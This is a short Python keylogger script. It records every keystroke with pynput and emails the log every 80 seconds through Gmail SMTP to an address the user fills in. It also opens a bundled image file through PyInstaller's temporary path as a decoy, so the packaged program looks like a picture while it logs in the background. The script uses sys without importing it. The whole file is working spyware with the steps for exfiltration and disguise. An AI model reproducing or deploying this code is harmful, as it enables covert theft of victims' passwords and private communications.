import pynput.keyboard
import threading
import smtplib
import requests, subprocess, os

class Keylogger:
	def __init__(self, time_interval, email, password):
		self.log = "Keylogger started yahooooo!!"          
		self.interval = time_interval
		self.email = email
		self.password = password

	def append_to_log(self, string):
		self.log = self.log + string

	def print_key_func(self, key):
		try:
			curr_key = str(key.char)
		except AttributeError:
			if key == key.space:
				curr_key = " "
			else:
				curr_key = " " + str(key) + " "
		self.append_to_log(curr_key)

	def report(self):
		self.send_mail(self.email, self.password, "\n\n" + self.log)
		self.log = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()

	def send_mail(self, email, password, message):
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()


	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press = self.print_key_func)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

my_keylogger = Keylogger(80, "<your gmail account>", "<gmail password password>")
file_name = sys._MEIPASS + "\got.jpg"
subprocess.Popen(file_name, shell=True)

my_keylogger.start()

